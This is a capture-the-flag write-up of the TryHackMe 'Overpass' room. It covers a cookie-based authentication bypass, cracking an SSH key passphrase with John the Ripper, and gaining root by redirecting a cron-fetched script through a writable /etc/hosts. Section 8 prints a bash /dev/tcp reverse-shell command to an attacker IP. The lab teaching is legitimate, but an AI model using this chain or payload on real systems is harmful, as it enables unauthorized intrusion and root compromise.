Written By Aryan Giri

# TryHackMe: Overpass

**Room:** [Overpass](https://tryhackme.com/room/overpass)  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Focus:** Web enumeration, authentication bypass, SSH key cracking, Linux privilege escalation

## 1. Reconnaissance

After starting the Overpass machine, we begin with an Nmap scan to identify open ports and running services.

```bash
nmap -sV -sC 10.48.155.225
```

<img width="816" height="627" alt="Screenshot 2026-10-18 141813" src="https://github.com/user-attachments/assets/8a818472-19be-4d42-b206-9ed40386f2cb" />


The scan reveals two important services:

- **Port 22:** SSH
- **Port 80:** HTTP

The HTTP service is running a Go-based web server. We will investigate the website first and return to SSH when we have obtained valid credentials.

## 2. Web Enumeration

Let's visit the target website:

[http://10.48.155.225/](http://10.48.155.225/)

<img width="1509" height="757" alt="Screenshot 2026-10-18 141901" src="https://github.com/user-attachments/assets/046f275e-7684-48a2-b790-6f6df02e83ca" />


The page welcomes us to Overpass and provides information about its password manager.

I inspected the page source to look for useful comments, linked JavaScript files, and other clues. Most of the linked JavaScript and CSS files did not immediately provide anything useful, but one HTML comment caught my attention.

<img width="1016" height="172" alt="Screenshot 2026-10-18 142300" src="https://github.com/user-attachments/assets/4e3a30e6-cc34-4cb1-b0ec-fb1a53be368c" />


```html
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?-->
```

This comment hints that the password manager might use a weak encryption method. It is not proof of a vulnerability by itself, but it gives us a reason to inspect the source code.

### Inspecting the password manager

Next, we visit the downloads page:

[http://10.48.155.225/downloads/](http://10.48.155.225/downloads/)

<img width="1492" height="731" alt="Screenshot 2026-10-18 141926" src="https://github.com/user-attachments/assets/be50ba5c-9c8b-47b8-8186-06bed609e249" />


The page provides the password manager's source code and build script. I downloaded both files for inspection.

<img width="1286" height="300" alt="Screenshot 2026-10-18 142105" src="https://github.com/user-attachments/assets/cd0fb575-b151-468c-841d-8b73ee32707a" />


The source code reveals two interesting implementation details:

- The password manager stores its data in `~/.overpass` with file permissions set to `0644`. This allows other local users to read the file, potentially exposing stored credentials.
- It uses a trivial substitution cipher rather than a proper cryptographic encryption scheme.

These weaknesses could become useful after obtaining local access. For now, we continue enumerating the web application.

<img width="1061" height="232" alt="Screenshot 2026-10-18 142129" src="https://github.com/user-attachments/assets/e25808d2-3389-48b2-9009-bdeef313ca9c" />


## 3. Directory Enumeration

We can use Dirb to discover directories and endpoints that are not linked directly from the homepage.

```bash
dirb http://10.48.155.225/
```

<img width="534" height="479" alt="Screenshot 2026-10-18 142233" src="https://github.com/user-attachments/assets/d69ad669-5dee-4a0c-a96d-c6d7debc4b21" />


The scan discovers an `/admin` endpoint.

Let's visit it:

[http://10.48.155.225/admin/](http://10.48.155.225/admin/)

<img width="866" height="574" alt="Screenshot 2026-10-18 142337" src="https://github.com/user-attachments/assets/b2f5e2e4-c2c6-4039-b03a-9d4ef79cb55c" />


We find an administrative login form, but we do not have valid credentials.

I tried basic SQL injection testing against the login form, but did not identify a SQL injection vulnerability. Instead of continuing to guess credentials, I inspected the page source and its JavaScript dependencies.

## 4. Authentication Bypass Through Client-Side Logic

While inspecting the admin page, I discovered a JavaScript file named `login.js`.

<img width="909" height="504" alt="Screenshot 2026-10-18 142416" src="https://github.com/user-attachments/assets/eb31c915-b6c2-4e05-a1ac-10bf67c21619" />


Let's inspect its contents.

<img width="1011" height="827" alt="Screenshot 2026-10-18 142455" src="https://github.com/user-attachments/assets/74c14614-6e93-47f3-8e3f-d702e54772ee" />


The JavaScript checks whether a cookie named `SessionToken` exists. If the cookie is present, the application allows access to the administrative content without validating its value.

This is a client-side authentication flaw. The application trusts the presence of a cookie instead of securely validating an authenticated session on the server.

### Creating the cookie

Return to Firefox and open Developer Tools using `Ctrl + Shift + I`.
<img width="1570" height="196" alt="Screenshot 2026-10-18 142600" src="https://github.com/user-attachments/assets/0353a480-5719-4d74-96d4-63fb8755d156" />

Navigate to the **Storage** tab, select the target site's cookies, and add a new cookie with these properties:

| Property | Value |
|---|---|
| Name | `SessionToken` |
| Value | `lolipoli` |

The value can be an arbitrary string because the vulnerable check only requires the cookie to exist.

<img width="533" height="234" alt="Screenshot 2026-10-18 142636" src="https://github.com/user-attachments/assets/c5d6747e-1dd1-4980-8443-5c9d0b8fea1a" />


After creating the cookie, refresh the page using `Ctrl + R`.

<img width="1242" height="797" alt="Screenshot 2026-10-18 142659" src="https://github.com/user-attachments/assets/2856e7c6-d3ae-47ac-8311-78db6266932a" />


We now have access to the administrative content. The page also exposes an RSA private key and identifies the username `james`.

The private key gives us a potential route to SSH access.

## 5. Obtaining SSH Access

Copy the exposed RSA private key into a local file named `overpass.id`.

```bash
nano overpass.id
```

Paste the complete private key into the file and save it.

SSH requires private key files to have restrictive permissions. Set the permissions accordingly:

```bash
chmod 600 overpass.id
```

<img width="564" height="204" alt="Screenshot 2026-10-18 142843" src="https://github.com/user-attachments/assets/b8d29ebe-f977-453c-bdca-317bb171af07" />


Now attempt to connect to the target using the username discovered on the admin page.

```bash
ssh -i overpass.id james@10.48.155.225
```

<img width="808" height="324" alt="Screenshot 2026-10-18 143020" src="https://github.com/user-attachments/assets/082e8e6a-8cfe-4f0d-ab56-c8d7858e62cf" />


SSH requests a passphrase for the private key. This means the key is encrypted, and we need to recover its passphrase before we can use it.

### Cracking the private key passphrase

We can use `ssh2john` to convert the private key into a format suitable for John the Ripper.

```bash
ssh2john overpass.id > overpass
```

Next, use the RockYou wordlist to attempt to crack the passphrase.

```bash
john overpass --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="814" height="405" alt="Screenshot 2026-10-18 143126" src="https://github.com/user-attachments/assets/ec19b5ed-b6c2-4ca5-b023-425ccc889d6d" />


John recovers the passphrase:

```text
james13
```

We can now retry the SSH connection.

```bash
ssh -i overpass.id james@10.48.155.225
```

Enter `james13` when prompted for the private key's passphrase.

<img width="747" height="138" alt="Screenshot 2026-10-18 143219" src="https://github.com/user-attachments/assets/a8d7c66d-777e-4d17-b35e-85d1b41bc417" />


We have obtained an SSH session as `james`.

## 6. Local Enumeration

After logging in, inspect the current directory and its contents.

```bash
ls -la
```

<img width="741" height="363" alt="Screenshot 2026-10-18 143237" src="https://github.com/user-attachments/assets/19f65281-121a-4903-9e0a-469dc9f56c90" />


We find several files, including `user.txt`, which contains the user flag.

```bash
cat user.txt
```

Another interesting file is `todo.txt`. It contains notes about pending tasks and mentions an automatic build process. This provides a useful lead for investigating privilege escalation.

### Inspecting the Overpass password manager

The password manager is available on the target system. Running it and selecting option `4` reveals a stored system service password.

<img width="495" height="263" alt="Screenshot 2026-10-18 143511" src="https://github.com/user-attachments/assets/8f2d3755-0d75-42e3-81a5-dcf9d65bb80d" />


Keep this credential in mind because it may be relevant to other local services.

### Checking sudo permissions

Next, inspect the commands available to the current user through sudo.

```bash
sudo -l
```

<img width="573" height="132" alt="Screenshot 2026-10-18 143546" src="https://github.com/user-attachments/assets/7a7bc97c-8b37-4aff-b503-a7d80f2f6e14" />


The recovered private key passphrase, `james13`, does not authenticate the sudo request. The system service password obtained from the password manager does work, but the output does not reveal a useful sudo command that `james` can execute.

This means we need to investigate other privilege-escalation paths.

I also checked the home directories:

```bash
ls -la /home
```

<img width="643" height="247" alt="Screenshot 2026-10-18 143652" src="https://github.com/user-attachments/assets/e874dff4-957c-4673-b7d2-830e3ab70b06" />


The listing includes a `tryhackme` directory that our current user cannot access. Rather than trying to force access, we can continue looking for misconfigurations in scheduled tasks and system configuration.

## 7. Privilege Escalation Through a Scheduled Build Script

Inspect the system's cron configuration.

```bash
cat /etc/crontab
```

<img width="821" height="500" alt="Screenshot 2026-10-18 143834" src="https://github.com/user-attachments/assets/851ce6ff-4089-4d1d-8405-9bf0ebdbf612" />


The configuration reveals a scheduled task that downloads a build script from the `overpass.thm` domain using `curl` and executes it with Bash.

This is an interesting privilege-escalation opportunity because the scheduled task runs with elevated privileges. If we can influence the script that gets downloaded, we may be able to execute commands as root.

Next, inspect the permissions of `/etc/hosts`.

```bash
ls -la /etc/hosts
```

<img width="533" height="77" alt="Screenshot 2026-10-18 143904" src="https://github.com/user-attachments/assets/c8d57285-b375-4bb0-8878-f1354b98d1aa" />


The file is writable by our current user. This is the critical misconfiguration.

The `/etc/hosts` file can override hostname resolution locally. If we change the entry for `overpass.thm` to point to our machine, the scheduled task may retrieve the build script from our HTTP server instead of the legitimate target.

**Attack chain:**

1. The cron job periodically requests a script from `overpass.thm`.
2. The writable `/etc/hosts` file lets us redirect that hostname to our machine.
3. We host a replacement build script containing a reverse-shell command.
4. The privileged scheduled task downloads and executes the replacement script.
5. The resulting shell provides root-level access.

## 8. Hosting the Replacement Build Script

On the attacker machine, create the directory structure expected by the scheduled build process.

```bash
mkdir -p downloads/src
```

Create the build script:

```bash
nano downloads/src/buildscript.sh
```

Insert the following reverse-shell command, replacing the example address with the IP address of your attacker machine that the target can reach.

```bash
bash -i >& /dev/tcp/192.168.132.162/4444 0>&1
```

<img width="713" height="133" alt="Screenshot 2026-10-18 144217" src="https://github.com/user-attachments/assets/6bc30b17-c948-4807-9a22-50cdeb5588a5" />


Save the file.

Now start a Python HTTP server from the directory containing the `downloads` directory. Port 80 is used because the scheduled task requests the script over HTTP.

```bash
sudo python3 -m http.server 80
```

<img width="665" height="182" alt="Screenshot 2026-10-18 144257" src="https://github.com/user-attachments/assets/6370c205-fd6e-4401-afe2-4e984df1a979" />


Open another terminal and start a Netcat listener on the port specified in the reverse-shell command.

```bash
nc -lvnp 4444
```

<img width="546" height="201" alt="Screenshot 2026-10-18 144326" src="https://github.com/user-attachments/assets/e15f057b-8913-49dc-a71f-56e6b235ea88" />


Both the HTTP server and the listener must remain running while we wait for the scheduled task.

## 9. Redirecting the Scheduled Task

Return to the SSH session on the target as `james`.

Open `/etc/hosts` for editing:

```bash
nano /etc/hosts
```

The file contains an entry similar to:

```text
127.0.0.1 overpass.thm
```

<img width="412" height="154" alt="Screenshot 2026-10-18 144344" src="https://github.com/user-attachments/assets/de489d4e-a536-4bb8-8b5c-4f39a229158d" />


Replace the loopback address with the IP address of your attacker machine.

For example:

```text
192.168.132.162 overpass.thm
```

Use your actual reachable attacker IP address, not the example address above.

<img width="427" height="206" alt="Screenshot 2026-10-18 144500" src="https://github.com/user-attachments/assets/1f01a20a-9a99-4543-902d-ffdad046ca5f" />


Save the file.

The next time the scheduled task runs, the hostname `overpass.thm` should resolve to the attacker machine. The task can then download the replacement build script from the HTTP server.

Wait for the scheduled task to execute. Its timing depends on the cron configuration.

<img width="553" height="167" alt="Screenshot 2026-10-18 144553" src="https://github.com/user-attachments/assets/3041f193-b607-46ea-9e2a-6c8071612c6c" />


If the request reaches the server and the script executes successfully, the Netcat listener should receive a connection.

<img width="651" height="237" alt="Screenshot 2026-10-18 144602" src="https://github.com/user-attachments/assets/9bd91518-ca9c-4024-b834-ca94bfb56769" />


Verify the current identity:

```bash
id
```

If the output identifies the user as `root`, privilege escalation has succeeded.

## 10. Retrieving the Root Flag

With root access, inspect the root user's directory.

```bash
ls -la 
```

Then read the root flag:

```bash
cat root.txt
```

<img width="544" height="274" alt="Screenshot 2026-10-18 144629" src="https://github.com/user-attachments/assets/eac578d9-2641-4d68-baaf-d9e2b228586f" />


This completes the Overpass machine.

## MITRE ATT&CK Mapping

The following mappings describe the techniques demonstrated in this lab. ATT&CK is designed primarily for real-world adversary behavior, so these are technique-level analogies rather than a claim that every lab action maps perfectly to a technique.

| Attack stage | Technique | ATT&CK ID | Relevance |
|---|---|---|---|
| Service enumeration | Network Service Discovery | T1046 | Nmap identifies exposed SSH and HTTP services. |
| Web authentication bypass | Exploit Public-Facing Application | T1190 | A flaw in the web application's authentication logic exposes administrative content. |
| Private key discovery | Unsecured Credentials: Private Keys | T1552.004 | An RSA private key is exposed through the administrative page. |
| Private key passphrase recovery | Password Cracking | T1110.002 | John the Ripper attempts to recover the encrypted key's passphrase. |
| SSH access | Remote Services: SSH | T1021.004 | The recovered key and passphrase enable remote access as `james`. |
| Local enumeration | System Information Discovery | T1082 | The attacker inspects system configuration and scheduled tasks. |
| Scheduled-task abuse | Scheduled Task/Job: Cron | T1053.003 | A cron job executes a downloaded script with elevated privileges. |
| Script delivery | Ingress Tool Transfer | T1105 | The target retrieves the replacement script from the attacker-controlled HTTP server. |
| Reverse shell | Command and Scripting Interpreter: Unix Shell | T1059.004 | The Bash script establishes a shell connection back to the attacker. |

The final privilege escalation relies on a specific combination of writable system configuration, hostname resolution manipulation, and privileged script execution. The table maps the closest applicable ATT&CK techniques without inventing a more specific technique for the entire chain.

## Lessons Learned

- Client-side authentication checks cannot replace server-side session validation.
- Private keys should not be exposed through unauthenticated or weakly authenticated web endpoints.
- Encrypted private keys still require strong passphrases.
- Sensitive password-manager files must have restrictive permissions.
- Scheduled tasks should not blindly execute remotely retrieved scripts with root privileges.
- System configuration files such as `/etc/hosts` must not be writable by unprivileged users.
- Privilege escalation often results from chaining several individually overlooked weaknesses rather than exploiting a single sophisticated vulnerability.
